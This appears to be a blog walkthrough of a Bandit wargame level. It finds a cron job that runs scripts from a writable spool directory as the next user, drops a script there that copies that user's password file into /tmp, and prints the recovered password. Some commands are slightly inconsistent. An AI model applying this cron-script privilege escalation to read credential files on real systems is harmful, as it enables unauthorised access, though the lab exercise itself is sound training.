+++
draft = false
date = 2020-05-06T17:26:01+02:00
title = "Level 23 -> Level 24"
description = ""
slug = ""
tags = []
categories = []
externalLink = ""
series = []
weight = 30
+++

**Level Goal**

A program is running automatically at regular intervals from **cron**, the time-based job scheduler. Look in **/etc/cron.d/** for the configuration and see what command is being executed.

**NOTE**: This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

**NOTE 2**: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…

## Solution ##

Let's check the script being executed:

{{< highlight bash >}}
bandit23@bandit:~$ cd /etc/cron.d
bandit23@bandit:/etc/cron.d$ ls
cronjob_bandit15_root  cronjob_bandit22  cronjob_bandit24
cronjob_bandit17_root  cronjob_bandit23  cronjob_bandit25_root
bandit23@bandit:/etc/cron.d$ cat cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
bandit23@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname
echo "Executing and deleting all scripts in /var/spool/$myname:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done
{{< /highlight>}}

The script is executing and then deleting all scripts owned by user `bandit23` under the `/var/spool/bandit24` directory, for which we have write permissions:

{{< highlight bash >}}
bandit23@bandit:/var/spool/bandit24$ ls -al /var/spool/
total 20
drwxr-xr-x  5 root root     4096 May 14 09:41 .
drwxr-xr-x 11 root root     4096 May  7 20:14 ..
drwxrwx-wx 28 root bandit24 4096 Aug 27 14:29 bandit24
drwxr-xr-x  3 root root     4096 May  3 14:18 cron
lrwxrwxrwx  1 root root        7 May  3 14:16 mail -> ../mail
drwx------  2 root root     4096 Jan 14  2018 rsyslog
{{< /highlight >}}

In order to solve this level we can create a script that prints out the content of **/etc/bandit_pass/bandit24** and put it under `/var/spool/bandit24`.

We will create the script under `/tmp/testing_level24` which is writable and we will call it `custom.sh`:

{{< highlight bash >}}
#!/bin/bash

cat /etc/bandit_pass/bandit24 > /tmp/testing_level24/custom.txt
{{< /highlight >}}

We have to give it executable permissions:

{{< highlight bash >}}
chmod 777 /tmp/testing_level24/custom.sh
{{< /highlight >}}

And create the `/tmp/testing_level24/custom.txt` file with writable permissions:

{{< highlight bash >}}
touch /tmp/testing_level24/custom.txt && chmod777 /tmp/testing_level24/custom.txt
{{< /highlight >}}


Now we can move the script under the right directory:

{{< highlight bash >}}
bandit23@bandit:/tmp$ mv /tmp/custom.sh /var/spool/bandit24/custom.sh
{{< /highlight >}}

After some time we will be able to read the password for the next level on the `/tmp/testing_level24/custom.txt` file:

{{< highlight bash >}}
bandit23@bandit:/tmp/testing_level24$ cat custom.txt
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
{{< /highlight >}}



&nbsp;

We successfully found the password for **Level 24** !
